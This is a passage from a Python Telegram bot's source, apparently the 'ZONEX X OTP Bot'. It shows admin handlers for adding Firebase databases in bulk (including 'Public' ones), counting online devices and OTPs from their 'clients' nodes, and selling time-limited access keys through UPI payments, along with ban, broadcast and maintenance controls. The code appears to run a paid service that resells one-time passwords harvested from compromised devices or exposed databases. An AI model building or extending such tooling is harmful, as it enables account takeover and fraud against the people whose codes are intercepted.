        await asyncio.gather(*[_safe_refresh(cfg) for cfg in data["firebase_configs"]])
        last_refresh = now_dt().strftime("%H:%M:%S")
        try:
            await q.edit_message_text(
                txt_firebase_panel(), reply_markup=kb_firebase(), parse_mode="HTML")
        except Exception as e:
            logger.warning(f"fb_refresh panel edit: {e}")

    elif cb == "fb_add":
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        await q.edit_message_text(
            "🔥 <b>Add Firebase — Step 1/2</b>\n\n"
            "🌐 <b>Firebase Realtime DB URL bhejo:</b>\n\n"
            "<i>Example:\nhttps://your-project-default-rtdb.firebaseio.com</i>\n\n"
            "⚠️ <i>Sirf .firebaseio.com URLs accepted hain.</i>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("❌ Cancel", callback_data="adm_firebase")
            ]]))
        ctx.user_data["fb_step"] = "url"

    elif cb == "fb_bulk_add":
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        await q.edit_message_text(
            "📦 <b>Bulk Firebase Add</b>\n"
            f"{'─'*28}\n\n"
            "Sabhi Firebase URLs ek saath paste karo.\n"
            "Har URL alag line mein — extra text/names OK hain.\n\n"
            "<b>Format:</b>\n"
            "<code>https://project1-default-rtdb.firebaseio.com\n"
            "https://project2-default-rtdb.firebaseio.com\n"
            "https://meri-app-rtdb.firebaseio.com</code>\n\n"
            "ℹ️ <i>Ye sab <b>Public</b> Firebase maane jaayenge.</i>\n"
            "🔄 <i>Duplicates automatically skip honge.</i>\n"
            "📊 <i>Baad mein summary milegi.</i>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("❌ Cancel", callback_data="adm_firebase")
            ]]))
        ctx.user_data["fb_step"] = "bulk"

    # Admin: Users
    elif cb == "adm_users":
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        users = data["users"]
        if not users:
            txt = "👥 <b>Users</b>\n\nKoi user nahi."
        else:
            lines = [f"👥 <b>Users ({len(users)})</b>\n"]
            for i, (uid_s, u) in enumerate(list(users.items())[:25], 1):
                tl    = time_left_str(int(uid_s))
                uname = u.get("username") or u.get("name","?")
                refs  = u.get("referral_count",0)
                lines.append(f"{i}. <code>{uid_s}</code> — {uname}\n"
                              f"   ⏱{tl}  👥{refs}refs\n")
            txt = "\n".join(lines)
        await q.edit_message_text(
            txt,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("⏱ Add/Ghata Time", callback_data="adm_add_time"),
                InlineKeyboardButton("◀️ Admin",          callback_data="admin"),
            ]]),
            parse_mode="HTML")

    # Admin: Add/Reduce Time
    elif cb == "adm_add_time":
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        await q.edit_message_text(
            "⏱ <b>User ka Time Add / Ghata karo</b>\n\n"
            "Format bhejo:\n<code>USER_ID HOURS</code>\n\n"
            "<b>Time Add karne ke liye:</b>\n"
            "<code>123456789 24</code>   → 24 ghante add\n"
            "<code>123456789 168</code>  → 7 din add\n\n"
            "<b>Time Ghatane ke liye (minus lagao):</b>\n"
            "<code>123456789 -6</code>   → 6 ghante ghata do\n"
            "<code>123456789 -24</code>  → 1 din ghata do\n\n"
            "<i>Negative value se time ghat jayega.</i>",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("❌ Cancel", callback_data="admin")
            ]]),
            parse_mode="HTML")
        ctx.user_data["awaiting_add_time"] = True

    # Admin: Refer Reward Hours
    elif cb == "adm_refer_hours":
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        rh = get_referral_hours()
        await q.edit_message_text(
            f"🎁 <b>Referral Reward Setting</b>\n\n"
            f"Abhi har referral pe milta hai: <b>{rh:.0f} hour</b>\n\n"
            f"Nayi value bhejo (sirf number):\n"
            f"<code>1</code>  → 1 hour\n"
            f"<code>2</code>  → 2 hours\n"
            f"<code>24</code> → 1 din\n\n"
            f"<i>0.5 = 30 minutes bhi ho sakta hai.</i>",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("❌ Cancel", callback_data="admin")
            ]]),
            parse_mode="HTML")
        ctx.user_data["awaiting_refer_hours"] = True

    # Admin: Set UPI
    elif cb == "adm_set_upi":
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        upi = data.get("upi_id","") or "Set nahi hai"
        await q.edit_message_text(
            f"💳 <b>UPI ID Set Karo</b>\n\n"
            f"Current UPI: <code>{upi}</code>\n\n"
            f"Naya UPI ID bhejo:\n"
            f"<i>(example: yourname@upi)</i>",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("❌ Cancel", callback_data="admin")
            ]]),
            parse_mode="HTML")
        ctx.user_data["awaiting_upi"] = True

    # Admin: Pricing Plans
    elif cb == "adm_plans":
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        await q.edit_message_text("💰 <b>Pricing Plans</b>\n\nYahan plans manage karo:",
                                   reply_markup=kb_plans_admin(), parse_mode="HTML")

    elif cb.startswith("plan_del:"):
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        idx   = int(cb.split(":")[1])
        plans = data.get("pricing_plans",[])
        if 0 <= idx < len(plans):
            removed = plans.pop(idx); save_data(data)
            await q.answer(f"✅ Hataya: {removed['label']}", show_alert=True)
        await q.edit_message_text("💰 <b>Pricing Plans</b>",
                                   reply_markup=kb_plans_admin(), parse_mode="HTML")

    elif cb == "plan_add":
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        await q.edit_message_text(
            "💰 <b>New Plan — Step 1/2</b>\n\n"
            "⏱ <b>Kitne hours ka plan hai?</b>\n\n"
            "Examples:\n"
            "<code>24</code>   → 1 din\n"
            "<code>168</code>  → 7 din\n"
            "<code>720</code>  → 30 din\n"
            "<code>0.5</code>  → 30 minute",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("❌ Cancel", callback_data="adm_plans")
            ]]),
            parse_mode="HTML")
        ctx.user_data["plan_step"] = "hours"

    # Admin: Broadcast
    elif cb == "adm_broadcast":
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        await q.edit_message_text(
            f"📢 <b>Broadcast</b>\n\n"
            f"Jo message bhejni hai type karo.\n"
            f"<b>{len(data['users'])}</b> users ko jayegi.\n\n"
            f"<i>Cancel: /start</i>",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("❌ Cancel", callback_data="admin")
            ]]),
            parse_mode="HTML")
        ctx.user_data["awaiting_broadcast"] = True

    # Admin: Approve payment
    elif cb.startswith("pay_ok:"):
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        pay_id  = cb.split(":", 1)[1]
        pending = data.get("pending_payments", {})
        pay     = pending.get(pay_id)
        if not pay:
            await q.answer("❌ Request nahi mila!", show_alert=True); return
        if pay.get("status") != "pending":
            await q.answer(f"Already {pay.get('status','?')}!", show_alert=True); return
        target_uid = pay["user_id"]
        hours      = pay["plan_hours"]
        add_hours(target_uid, hours)
        pay["status"] = "approved"
        save_data(data)
        new_tl = time_left_detailed(target_uid)
        try:
            await q.edit_message_caption(
                caption=(q.message.caption or "") +
                        f"\n\n✅ <b>APPROVED</b> — {int(hours)}h add hua\n⏱ {new_tl}",
                parse_mode="HTML")
        except: pass
        try:
            await q.answer("✅ Approved! User ko access mil gaya.", show_alert=True)
        except Exception:
            pass
        try:
            await ctx.bot.send_message(
                target_uid,
                f"🎉 <b>Payment Approved!</b>\n\n"
                f"📦 Plan : <b>{pay['plan_label']}</b>\n"
                f"⏱ Added: <b>{int(hours)} hours</b>\n\n"
                f"Access: {new_tl}\n\n"
                f"<i>Bot use karo aur enjoy karo! 🚀</i>",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔑 KEY SYSTEM", callback_data="user_panel")
                ]]))
        except: pass

    # Admin: Reject payment
    elif cb.startswith("pay_no:"):
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        pay_id  = cb.split(":", 1)[1]
        pending = data.get("pending_payments", {})
        pay     = pending.get(pay_id)
        if not pay:
            await q.answer("❌ Request nahi mila!", show_alert=True); return
        if pay.get("status") != "pending":
            await q.answer(f"Already {pay.get('status','?')}!", show_alert=True); return
        pay["status"] = "rejected"
        save_data(data)
        try:
            await q.edit_message_caption(
                caption=(q.message.caption or "") + "\n\n❌ <b>REJECTED by admin</b>",
                parse_mode="HTML")
        except: pass
        try:
            await q.answer("❌ Rejected.", show_alert=True)
        except Exception:
            pass
        try:
            await ctx.bot.send_message(
                pay["user_id"],
                f"❌ <b>Payment Rejected</b>\n\n"
                f"Tumhara payment verify nahi ho saka.\n\n"
                f"<b>Kya karo?</b>\n"
                f"• Sahi screenshot bhejo\n"
                f"• Admin se contact karo: {ADMIN_USERNAME}\n\n"
                f"<i>Dobara try karo.</i>",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("💰 Buy Key", callback_data="buy")
                ]]))
        except: pass

    # Admin: Set QR code
    elif cb == "adm_set_qr":
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        qr = data.get("qr_file_id", "")
        await q.edit_message_text(
            f"📸 <b>Set QR Code</b>\n\n"
            f"{'✅ QR set hai (change karne ke liye nayi photo bhejo).' if qr else '⚠️ Abhi koi QR nahi hai.'}\n\n"
            f"Apna UPI QR code photo bhejo 👇\n"
            f"<i>(Jo user ko payment ke time dikhega)</i>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("❌ Cancel", callback_data="admin")
            ]]))
        ctx.user_data["awaiting_qr"] = True

    # Admin: View pending payments
    elif cb == "adm_pending":
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        pending = data.get("pending_payments", {})
        plist   = [(pid, p) for pid, p in pending.items() if p.get("status") == "pending"]
        if not plist:
            await q.edit_message_text(
                "📋 <b>Pending Payments</b>\n\nKoi pending payment nahi hai. ✅",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("◀️ Admin", callback_data="admin")
                ]]))
            return
        lines = [f"📋 <b>Pending Payments ({len(plist)})</b>\n"]
        for pid, p in list(plist)[-10:]:
            lines.append(
                f"\n🆔 <code>{pid}</code>\n"
                f"👤 {p['user_name']} · <code>{p['user_id']}</code>\n"
                f"📦 {p['plan_label']} — ₹{p['plan_price']}\n"
                f"🕐 {p['timestamp']}\n")
        await q.edit_message_text(
            "".join(lines),
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("◀️ Admin", callback_data="admin")
            ]]))

    # Admin: Ban list
    elif cb == "adm_ban_list":
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        users = data["users"]
        if not users:
            await q.edit_message_text(
                "🚫 <b>Ban / Unban Users</b>\n\nKoi user nahi.",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("◀️ Admin", callback_data="admin")
                ]])); return
        rows = []
        for uid_s, u in list(users.items())[:20]:
            banned = u.get("banned", False)
            uname_  = u.get("username") or u.get("name", "?")
            label   = f"{'🔴' if banned else '🟢'} {uname_} ({uid_s[-4:]})"
            action  = "unban" if banned else "ban"
            rows.append([InlineKeyboardButton(label,
                         callback_data=f"adm_ban_toggle:{uid_s}:{action}")])
        rows.append([InlineKeyboardButton("◀️ Admin", callback_data="admin")])
        await q.edit_message_text(
            "🚫 <b>Ban / Unban Users</b>\n"
            f"{'─'*28}\n"
            "🟢 = Active   🔴 = Banned\n"
            "<i>Naam pe tap karo ban/unban karne ke liye</i>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(rows))

    # Admin: Ban/Unban toggle
    elif cb.startswith("adm_ban_toggle:"):
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        parts   = cb.split(":", 2)
        tgt_uid = parts[1]
        action  = parts[2]
        if tgt_uid not in data["users"]:
            await q.answer("❌ User nahi mila!", show_alert=True); return
        data["users"][tgt_uid]["banned"] = (action == "ban")
        save_data(data)
        uname_ = (data["users"][tgt_uid].get("username") or
                  data["users"][tgt_uid].get("name", tgt_uid))
        try:
            await q.answer(
                f"{'🚫 Banned' if action=='ban' else '✅ Unbanned'}: {uname_}",
                show_alert=True)
        except Exception:
            pass
        users = data["users"]
        rows = []
        for uid_s, u in list(users.items())[:20]:
            is_b   = u.get("banned", False)
            uname_  = u.get("username") or u.get("name", "?")
            label   = f"{'🔴' if is_b else '🟢'} {uname_} ({uid_s[-4:]})"
            act     = "unban" if is_b else "ban"
            rows.append([InlineKeyboardButton(label,
                         callback_data=f"adm_ban_toggle:{uid_s}:{act}")])
        rows.append([InlineKeyboardButton("◀️ Admin", callback_data="admin")])
        await q.edit_message_text(
            "🚫 <b>Ban / Unban Users</b>\n"
            f"{'─'*28}\n"
            "🟢 = Active   🔴 = Banned\n"
            "<i>Naam pe tap karo ban/unban karne ke liye</i>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(rows))

    # Admin: Maintenance toggle
    elif cb == "adm_maintenance":
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        current = data.get("maintenance", False)
        data["maintenance"] = not current
        save_data(data)
        new_state = data["maintenance"]
        state_txt = "🔴 ON — Users blocked" if new_state else "🟢 OFF — Bot running normally"
        try:
            await q.answer(f"Maintenance: {state_txt}", show_alert=True)
        except Exception:
            pass
        active = sum(1 for s, u in data["users"].items() if has_access(int(s)))
        rh = get_referral_hours()
        maint_line = f"\n⚙️ <b>Maintenance: {'🔴 ON' if new_state else '🟢 OFF'}</b>" 
        await q.edit_message_text(
            f"👑 <b>Admin Panel</b>\n{'─'*28}\n"
            f"🟢 Online : <code>{count_online()}</code>   📱 Total  : <code>{count_total()}</code>\n"
            f"🔑 OTPs   : <code>{count_otps()}</code>     👥 Users  : <code>{len(data['users'])}</code>\n"
            f"✅ Active : <code>{active}</code>            🔥 DBs    : <code>{len(data['firebase_configs'])}</code>\n"
            f"🎁 Refer  : <code>{rh:.0f}h</code> per referral\n"
            f"🕐 Refresh: <code>{last_refresh}</code>"
            + maint_line,
            reply_markup=kb_admin(), parse_mode="HTML")

    elif cb == "noop":
        pass

# ─── Text handler ─────────────────────────────────────────────────────────────
async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    nm   = update.effective_user.first_name or "User"
    text = update.message.text.strip()
    ud   = ctx.user_data

    if text.startswith("/") and not (text == "/skip" and ud.get("fb_step") == "api_key"):
        return

    # ── Key entry ──────────────────────────────────────────────────────────
    if ud.get("waiting_key"):
        correct = get_key(uid)
        if text.upper() != correct.upper():
            await update.message.reply_text(
                f"❌ <b>Galat Key!</b>\n\nSahi key copy karke send karo:\n\n<code>{correct}</code>",
                parse_mode="HTML")
            return
        ud.pop("waiting_key")
        data["users"][str(uid)]["key_verified"] = True
        save_data(data)
        if not device_cache: await refresh_all()
        await update.message.reply_text(
            f"✅ <b>Key Verified!</b> Panel khul gaya 🎉\n"
            f"{'━'*28}\n\n"
            + txt_welcome_panel(nm, uid),
            reply_markup=kb_main(uid), parse_mode="HTML")
        return

    # ── Firebase bulk add ────────────────────────────────────────────────────
    if ud.get("fb_step") == "bulk":
        if not is_admin(uid):
            ud.pop("fb_step", None); return
        ud.pop("fb_step")
        # Extract all URLs from the message (any line format)
        raw_found = re.findall(
            r"https?://[a-zA-Z0-9\-]+(?:-default-rtdb)?\.firebaseio\.com(?:/[^\s]*)?",
            text)
        # Also try lines that might be missing https://
        for line in text.splitlines():
            line = line.strip()
            if "firebaseio.com" in line and not line.startswith("http"):
                candidate = "https://" + line
                if re.match(r"https://[a-zA-Z0-9\-].*\.firebaseio\.com", candidate):
                    raw_found.append(candidate)
        # Normalize all URLs (remove trailing slashes, deduplicate)
        seen_in_batch: set = set()
        existing_urls = {c["url"].rstrip("/") for c in data["firebase_configs"]}
        added, skipped, invalid = [], [], 0
        for raw_url in raw_found:
            clean_url = raw_url.rstrip("/")
            if clean_url in seen_in_batch:
                continue  # duplicate within this batch
            seen_in_batch.add(clean_url)
            if clean_url in existing_urls:
                skipped.append(clean_url)
                continue
            used_labels = {c["label"] for c in data["firebase_configs"]}
            n = len(data["firebase_configs"]) + 1
            while f"Firebase {n}" in used_labels:
                n += 1
            label = f"Firebase {n}"
            data["firebase_configs"].append({"url": clean_url, "label": label, "key": ""})
            existing_urls.add(clean_url)
            added.append((label, clean_url))
        if added or skipped:
            save_data(data)
        # Immediately refresh all newly added Firebase DBs in background
        for lbl, url in added:
            new_cfg = next((c for c in data["firebase_configs"] if c["url"] == url), None)
            if new_cfg:
                asyncio.create_task(refresh_clients_only(new_cfg))
        # Build summary
        total_processed = len(seen_in_batch) + invalid
        lines = [
            f"📦 <b>Bulk Firebase — Result</b>",
            f"{'─'*28}",
            f"📊 Processed : <b>{total_processed}</b>",
            f"✅ Added     : <b>{len(added)}</b>",
            f"♻️ Duplicate : <b>{len(skipped)}</b>",
            f"❌ Invalid   : <b>{invalid}</b>",
            f"{'─'*28}",
        ]
        if added:
            lines.append(f"\n<b>✅ Added ({len(added)}):</b>")
            for lbl, url in added[:20]:  # show max 20
                lines.append(f"  • <b>{lbl}</b>")
            if len(added) > 20:
                lines.append(f"  <i>...aur {len(added)-20} zyada</i>")
        if skipped:
            lines.append(f"\n<b>♻️ Already Exist ({len(skipped)}):</b>")
            for url in skipped[:10]:
                lines.append(f"  • <code>{url[:50]}</code>")
            if len(skipped) > 10:
                lines.append(f"  <i>...aur {len(skipped)-10} zyada</i>")
        if not added and not skipped:
            lines.append(
                "\n❌ <b>Koi valid Firebase URL nahi mila.</b>\n"
                "<i>https://...firebaseio.com format mein paste karo.</i>")
        else:
            lines.append(f"\n⏳ <i>Naye databases sync ho rahe hain...</i>")
        await update.message.reply_text(
            "\n".join(lines), parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔥 Firebase List", callback_data="adm_firebase"),
                InlineKeyboardButton("👑 Admin",         callback_data="admin"),
            ]])); return

    # ── Firebase add — URL ───────────────────────────────────────────────────
    if ud.get("fb_step") == "url":
        if not is_admin(uid):
            ud.pop("fb_step", None); return
        raw = text.strip().rstrip("/")
        # Normalize: accept both with and without https://
        if not raw.startswith("http"):
            raw = "https://" + raw
        # Validate it is a Firebase RTDB URL
        if "firebaseio.com" not in raw:
            await update.message.reply_text(
                "❌ <b>Invalid URL!</b>\n\n"
                "Sirf Firebase Realtime DB URLs accepted hain.\n\n"
                "<b>Sahi format:</b>\n"
                "<code>https://your-project-default-rtdb.firebaseio.com</code>\n\n"
                "Dobara sahi URL bhejo ya /cancel likhke chhod do.",
                parse_mode="HTML")
            return
        # Duplicate check
        existing_norm = {c["url"].rstrip("/") for c in data["firebase_configs"]}
        if raw in existing_norm:
            await update.message.reply_text(
                "⚠️ <b>Yeh Firebase pehle se exist karta hai!</b>\n\n"
                "Alag URL bhejo ya Firebase panel mein wapas jao.",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔥 Firebase List", callback_data="adm_firebase")
                ]]))
            ud.pop("fb_step", None)
            return
        ud["fb_url"]  = raw
        ud["fb_step"] = "api_key"
        await update.message.reply_text(
            "✅ <b>URL Valid!</b>\n\n"
            "🔥 <b>Add Firebase — Step 2/2</b>\n\n"
            "🔑 <b>Firebase API Key bhejo:</b>\n"
            "<i>Database secret ya Web API key</i>\n\n"
            "ℹ️ Agar tumhara Firebase <b>Public</b> hai (koi key nahi chahiye)\n"
            "toh <code>/skip</code> bhejo.",
            parse_mode="HTML"); return

    # ── Firebase add — API Key ───────────────────────────────────────────────
    if ud.get("fb_step") == "api_key":
        if not is_admin(uid):
            ud.pop("fb_step", None); return
        api_key = "" if text.strip() == "/skip" else text.strip()
        ud["fb_api_key"] = api_key
        ud["fb_step"]    = "label"
        skipped_txt = " (Public DB — key skip kiya)" if not api_key else ""
        await update.message.reply_text(
            f"✅ <b>API Key {'Skip!' if not api_key else 'Saved!'}</b>{skipped_txt}\n\n"
            "🔥 <b>Almost done!</b>\n\n"
            "📝 <b>Ab iska naam/label do:</b>\n"
            "<i>Example: Main DB, Client 2, Backup</i>",
            parse_mode="HTML"); return

    # ── Firebase add — Label (with connectivity validation) ───────────────────
    if ud.get("fb_step") == "label":
        if not is_admin(uid):
            ud.pop("fb_step", None); return
        new_url = ud.pop("fb_url", "")
        api_key = ud.pop("fb_api_key", "")
        ud.pop("fb_step")
        label = text.strip()[:30] or "Firebase DB"
        # Final duplicate check (in case another was added between steps)
        existing_norm = {c["url"].rstrip("/") for c in data["firebase_configs"]}
        if new_url in existing_norm:
            await update.message.reply_text(
                "⚠️ <b>Yeh Firebase pehle se exist karta hai!</b>",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔥 Firebase List", callback_data="adm_firebase")
                ]])); return
        # Test connectivity before saving
        wait_msg = await update.message.reply_text(
            "⏳ <b>Firebase check ho raha hai...</b>",
            parse_mode="HTML")
        test_cfg = {"url": new_url, "label": label, "key": api_key}
        try:
            clients = await fb_get(new_url, "clients", api_key)
            conn_ok = isinstance(clients, dict)
            if clients is None:
                # None typically means auth error or unreachable
                conn_ok = False
                conn_note = "⚠️ URL unreachable ya auth fail. Public DB ho toh bhi add kar diya gaya."
            elif not clients:
                conn_ok = True
                conn_note = "ℹ️ Connected — abhi koi client data nahi hai."
            else:
                conn_ok = True
                conn_note = f"✅ Connected — <b>{len(clients)}</b> entries mili."
        except Exception as e:
            conn_ok = False
            conn_note = f"⚠️ Connection test failed: <i>{str(e)[:80]}</i>"
            logger.warning(f"Firebase connectivity test [{label}]: {e}")
        # Save regardless (admin may want to add even if currently unreachable)
        new_cfg = {"url": new_url, "label": label, "key": api_key}
        data["firebase_configs"].append(new_cfg)
        save_data(data)
        if conn_ok:
            fb_conn_status[label] = "ok"
            asyncio.create_task(refresh_clients_only(new_cfg))
        else:
            fb_conn_status[label] = "error"
        key_status = "🔑 Key set" if api_key else "🌐 Public"
        on_c  = _fb_online_count(label)
        tot_c = _fb_total_count(label)
        try:
            await wait_msg.delete()
        except Exception:
            pass
        await update.message.reply_text(
            f"{'✅' if conn_ok else '⚠️'} <b>Firebase {'Added' if conn_ok else 'Added (with warning)'}!</b>\n\n"
            f"📝 Label   : <b>{label}</b>\n"
            f"🌐 URL     : <code>{new_url}</code>\n"
            f"🔑 Auth    : {key_status}\n"
            f"🟢 Online  : <code>{on_c}</code>\n"
            f"📱 Total   : <code>{tot_c}</code>\n\n"
            f"{conn_note}\n\n"
            f"⏳ <i>Data auto-sync mein aa jaayega.</i>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔥 Firebase List", callback_data="adm_firebase"),
                InlineKeyboardButton("👑 Admin",         callback_data="admin"),
            ]])); return

    # ── Admin: Add/Reduce Time ───────────────────────────────────────────────
    if ud.get("awaiting_add_time") and is_admin(uid):
        ud.pop("awaiting_add_time")
        parts = text.split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Format: USER_ID HOURS (e.g. 123456 24 ya 123456 -6)"); return
        try:
            target = int(parts[0])
            hours  = float(parts[1])
        except:
            await update.message.reply_text("❌ User ID aur hours number hone chahiye."); return
        if str(target) not in data["users"]:
            data["users"][str(target)] = {
                "username":"manual","name":"manual","joined":now_str(),
                "key":_gen_key_raw(),"expires_at":None,"referred_by":None,
                "referral_count":0,"channels_done":True,"key_verified":True,
                "banned":False,
            }
        add_hours(target, hours)
        tl = time_left_str(target)
        action = "Add" if hours >= 0 else "Ghata"
        await update.message.reply_text(
            f"✅ <b>Time {action} Ho Gaya!</b>\n\n"
            f"👤 User   : <code>{target}</code>\n"
            f"⏱ Change : <b>{hours:+.1f}h</b>\n"
            f"📅 Ab ka time: <b>{tl}</b>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("👑 Admin Panel", callback_data="admin")
            ]]))
        try:
            msg = (f"🎁 <b>Access Added!</b>\n\nAdmin ne <b>{hours:.0f} hours</b> add kiye!\n⏱ {tl}"
                   if hours > 0 else
                   f"⚠️ <b>Access Updated</b>\n\nTumhara access time adjust hua.\n⏱ {tl}")
            await update.get_bot().send_message(target, msg, parse_mode="HTML")
        except: pass
        return

    # ── Admin: Refer Reward Hours ────────────────────────────────────────────
    if ud.get("awaiting_refer_hours") and is_admin(uid):
        ud.pop("awaiting_refer_hours")
        try:
            rh = float(text)
            if rh < 0:
                await update.message.reply_text("❌ 0 ya usse zyada value do."); return
        except:
            await update.message.reply_text("❌ Sirf number bhejo (e.g. 1 ya 2)."); return
        data["referral_hours"] = rh
        save_data(data)
        await update.message.reply_text(
            f"✅ <b>Referral Reward Updated!</b>\n\n"
            f"🎁 Ab har referral pe milega: <b>{rh:.1f} hour</b>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("👑 Admin Panel", callback_data="admin")
            ]])); return

    # ── Admin: Set UPI ───────────────────────────────────────────────────────
    if ud.get("awaiting_upi") and is_admin(uid):
        ud.pop("awaiting_upi")
        data["upi_id"] = text.strip()
        save_data(data)
        await update.message.reply_text(
            f"✅ <b>UPI ID Set!</b>\n\n<code>{text.strip()}</code>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("👑 Admin Panel", callback_data="admin")
            ]])); return

    # ── Admin: Add Plan — Step 1 (hours) ────────────────────────────────────
    if ud.get("plan_step") == "hours" and is_admin(uid):
        try:
            hours = float(text)
        except:
            await update.message.reply_text("❌ Sirf number bhejo (e.g. 24 ya 0.5)"); return
        ud["plan_hours"] = hours
        ud["plan_step"]  = "price"
        if hours >= 720:
            auto = f"{int(hours//720)} Month"
        elif hours >= 168:
            auto = f"{int(hours//168)} Week"
        elif hours >= 24:
            auto = f"{int(hours//24)} Din ({int(hours)}h)"
        elif hours < 1:
            auto = f"{int(hours*60)} Minute"
        else:
            auto = f"{hours}h"
        ud["plan_label"] = auto
        await update.message.reply_text(
            f"✅ Time: <b>{hours}h</b> ({auto})\n\n"
            f"💰 <b>Step 2/2 — Kitne Rupaye?</b>\n\n"
            f"Sirf number bhejo (e.g. <code>30</code>):",
            parse_mode="HTML"); return

    # ── Admin: Add Plan — Step 2 (price) ────────────────────────────────────
    if ud.get("plan_step") == "price" and is_admin(uid):
        try:
            price = int(text)
        except:
            await update.message.reply_text("❌ Sirf number bhejo (e.g. 30)"); return
        hours = ud.pop("plan_hours")
        label = ud.pop("plan_label")
        ud.pop("plan_step")
        plan_id = f"p{random.randint(1000,9999)}"
        data["pricing_plans"].append({"id":plan_id,"hours":hours,"price":price,"label":label})
        save_data(data)
        await update.message.reply_text(
            f"✅ <b>Plan Add Ho Gaya!</b>\n\n"
            f"📦 <b>{label}</b>\n"
            f"⏱ {hours}h  |  💵 ₹{price}",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("💰 Plans Dekho", callback_data="adm_plans"),
                InlineKeyboardButton("👑 Admin",       callback_data="admin"),
            ]])); return

    # ── Admin: Broadcast (text) ──────────────────────────────────────────────
    if ud.get("awaiting_broadcast") and is_admin(uid):
        ud.pop("awaiting_broadcast")
        sent = failed = 0
        msg  = f"📢 <b>ZONEX X OTP Bot</b>\n\n{text}\n\n<i>— {ADMIN_USERNAME}</i>"
        for uid_s in data["users"]:
            try:
                await ctx.bot.send_message(int(uid_s), msg, parse_mode="HTML",
                                           disable_web_page_preview=False)
                sent += 1
            except: failed += 1
        await update.message.reply_text(
            f"📢 <b>Broadcast Done!</b>\n✅ Sent: {sent}\n❌ Failed: {failed}",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("👑 Admin Panel", callback_data="admin")
            ]])); return

# ─── Photo handler ────────────────────────────────────────────────────────────
async def photo_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    nm   = update.effective_user.first_name or "User"
    ud   = ctx.user_data
    photo = update.message.photo[-1]

    if is_admin(uid) and ud.get("awaiting_broadcast"):
        ud.pop("awaiting_broadcast")
        caption = update.message.caption or ""
        sent = failed = 0
        for uid_s in data["users"]:
            try:
                await ctx.bot.send_photo(int(uid_s), photo=photo.file_id,
                                         caption=caption, parse_mode="HTML")
                sent += 1
            except: failed += 1
        await update.message.reply_text(
            f"📢 <b>Broadcast Done!</b>\n✅ Sent: {sent}\n❌ Failed: {failed}",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("👑 Admin Panel", callback_data="admin")
            ]]))
        return

    if is_admin(uid) and ud.get("awaiting_qr"):
        ud.pop("awaiting_qr")
        data["qr_file_id"] = photo.file_id
        save_data(data)
        await update.message.reply_text(
            "✅ <b>QR Code Set!</b>\n\nAb Buy Key page pe dikhega jab user koi plan tap karega.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("👑 Admin Panel", callback_data="admin")
            ]]))
        return

    plan_id = ud.get("awaiting_payment_screenshot")
    if plan_id:
        ud.pop("awaiting_payment_screenshot")
        plans = data.get("pricing_plans", [])
        plan  = next((p for p in plans if p["id"] == plan_id), None)
        if not plan:
            await update.message.reply_text(
                "❌ Plan nahi mila. /start se dobara try karo.")
            return

        pay_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
        while pay_id in data.get("pending_payments", {}):
            pay_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=6))

        data.setdefault("pending_payments", {})[pay_id] = {
            "user_id":          uid,
            "user_name":        nm,
            "plan_id":          plan_id,
            "plan_label":       plan["label"],
            "plan_hours":       plan["hours"],
